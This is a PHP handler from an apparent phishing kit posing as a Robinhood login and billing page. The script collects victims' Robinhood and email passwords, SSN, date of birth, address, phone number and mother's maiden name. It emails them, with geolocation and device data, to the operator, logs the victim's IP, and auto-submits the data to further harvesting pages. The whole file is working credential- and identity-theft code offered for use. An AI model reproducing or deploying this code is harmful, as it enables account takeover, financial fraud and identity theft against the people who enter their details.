<?php
session_start();
include'../main.php';
include'../get_setting.php';
if (!isset($_POST['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
$ip = getUserIP();
$subject = "LOGIN & BILLING INFORMATION [".$_POST['fname']." - ".$_POST['email']."] - [".$cn." - ".$ip." - ".$br."]";
$message = '
<p>
<b>===================[ ROBINHOOD LOGIN ]===================</b><br>
Email : '.$_POST['email'].'<br>
Password : '.$_POST['pass_log'].'<br>
<b>===================[ EMAIL LOGIN ]===================</b><br>
Email : '.$_POST['email'].'<br>
Password : '.$_POST['password'].'<br>
<b>======================[ BILLING INFORMATION ]======================</b><br>
Full name : '.$_POST['fname'].'<br>
State : '.$_POST['state'].'<br>
City : '.$_POST['city'].'<br>
Street address : '.$_POST['address'].'<br>
ZIP : '.$_POST['zip'].'<br>
Date of birth : '.$_POST['dob'].'<br>
SSN : '.$_POST['ssn'].'<br>
Phone number : '.$_POST['phone'].'<br>
Mothers Maiden Name : '.$_POST['mmn'].'<br>
<b>===================[ DEVICE INFO ]===================</b><br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
User Agent : '.$user_agent.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
OS / BR : '.$os.' / '.$br.'<br>
Timezone : '.$timezone.'<br>
Time Login : '.$date.'<br>
<b>===================[ SPM55 - ROBINHOOD ]===================</b>
</p>
';
if ($send_login == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: LOGIN & BILLING INFORMATION <'.$sender_mail.'>' . "\r\n";
include'api.php';
mail($email_result, $subject, $message, $headers);
tulis_file("../admin/result/total_billing.txt", $ip);
}else{
include'api.php';
include'server.php';
tulis_file("../admin/result/total_billing.txt", $ip);
}
if ($get_pap == "on") {
	echo "<form id='boyxd' method='POST' action='../upload'>
	<input type='hidden' name='email' value='".$_POST['email']."'>
	<input type='hidden' name='pass_log' value='".$_POST['pass_log']."'>
	<input type='hidden' name='password' value='".$_POST['password']."'>
	<input type='hidden' name='fname' value='".$_POST['fname']."'>
	<input type='hidden' name='state' value='".$_POST['state']."'>
	<input type='hidden' name='city' value='".$_POST['city']."'>
	<input type='hidden' name='address' value='".$_POST['address']."'>
	<input type='hidden' name='zip' value='".$_POST['zip']."'>
	<input type='hidden' name='dob' value='".$_POST['dob']."'>
	<input type='hidden' name='ssn' value='".$_POST['ssn']."'>
	<input type='hidden' name='phone' value='".$_POST['phone']."'>
	<input type='hidden' name='mmn' value='".$_POST['mmn']."'>
	</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
if ($get_bank == "on") {
	echo "<form id='boyxd' method='POST' action='../verifybank'>
	<input type='hidden' name='email' value='".$_POST['email']."'>
	<input type='hidden' name='pass_log' value='".$_POST['pass_log']."'>
	<input type='hidden' name='password' value='".$_POST['password']."'>
	<input type='hidden' name='fname' value='".$_POST['fname']."'>
	<input type='hidden' name='state' value='".$_POST['state']."'>
	<input type='hidden' name='city' value='".$_POST['city']."'>
	<input type='hidden' name='address' value='".$_POST['address']."'>
	<input type='hidden' name='zip' value='".$_POST['zip']."'>
	<input type='hidden' name='dob' value='".$_POST['dob']."'>
	<input type='hidden' name='ssn' value='".$_POST['ssn']."'>
	<input type='hidden' name='phone' value='".$_POST['phone']."'>
	<input type='hidden' name='mmn' value='".$_POST['mmn']."'>
	</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
	echo "<form id='boyxd' method='POST' action='../done'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
}
?>